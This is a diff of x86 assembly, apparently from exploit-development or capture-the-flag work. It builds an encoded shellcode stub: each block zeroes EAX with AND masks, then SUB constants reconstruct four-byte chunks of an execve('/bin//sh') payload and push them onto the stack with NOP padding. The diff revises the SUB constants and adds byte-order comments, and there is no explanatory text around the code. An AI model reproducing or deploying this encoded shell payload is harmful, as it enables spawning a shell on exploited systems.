@@ -21,75 +21,84 @@ global _start
 		;========================
 		;  set $eax = shellcode[0:-4]
 		; \x58\x99\xcd\x80
+		; reverse : 
+		; \x80\xcd\x99\x58
 		;========================
 		; set $eax = 0
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 8d776680H
-sub eax, 8d776680H
-sub eax, 8c776580H
+sub eax, 2ac02238H
+sub eax, 2a392238H
+sub eax, 2a392238H
 		push eax
-		
 		;========================
 		;  set $eax = shellcode[-8:-4]
 		; \x89\xe3\x6a\x0b
+		; reverse : 
+		; \x0b\x6a\xe3\x89
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 7d628752H
-sub eax, 7c5d8752H
-sub eax, 7c5c8751H
+		sub eax, 5232c028H
+		sub eax, 51312e28H
+		sub eax, 51312e27H
 		push eax
-		
 		;========================
 		;  set $eax = shellcode[-12:-8]
 		; \x2f\x62\x69\x6e
+		; reverse : 
+		; \x6e\x69\x62\x2f
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 9b8a8786H
-sub eax, 9a898786H
-sub eax, 9a898786H
+		sub eax, 31323546H
+		sub eax, 30323446H
+		sub eax, 30323445H
 		push eax
 		;========================
 		;  set $eax = shellcode[-16:-12]
 		; \x2f\x73\x68\x68
+		; reverse : 
+		; \x68\x68\x73\x2f
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 9b848888H
-sub eax, 9a848788H
-sub eax, 9a838788H
+sub eax, 33332f46H
+sub eax, 32322f46H
+sub eax, 32322e45H
 		push eax
-		
 		;========================
 		;  set $eax = shellcode[-20:-16]
 		; \xc9\x51\x68\x2f
+		; reverse : 
+		; \x2f\x68\x51\xc9
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-		sub eax, 678f889bH
-		sub eax, 678f879bH
-		sub eax, 678f879bH
+sub eax, 46333ac0H
+sub eax, 45323a3cH
+sub eax, 4532393bH
 		push eax
 		;========================
 		;  set $eax = shellcode[-21:-20]
 		; \x90\x90\x90\x31
+		; reverse : 
+		; \x31\x90\x90\x90
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 7a7a7a9bH
-sub eax, 7a7a7a9aH
-sub eax, 7a7a7a9aH
+sub eax, 45252526H
+sub eax, 45252525H
+sub eax, 44252525H
 		push eax
 		;========================
 		;  set $eax = \x90\x90\x90\x90 (nop)
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 7a7a7a7bH
-sub eax, 7a7a7a7bH
-sub eax, 7a7a7a7aH
+sub eax, 25252526H
+sub eax, 25252525H
+sub eax, 25252525H
 		push eax
 		;========================
 		; fill pad with nop ; then $eip = $esp
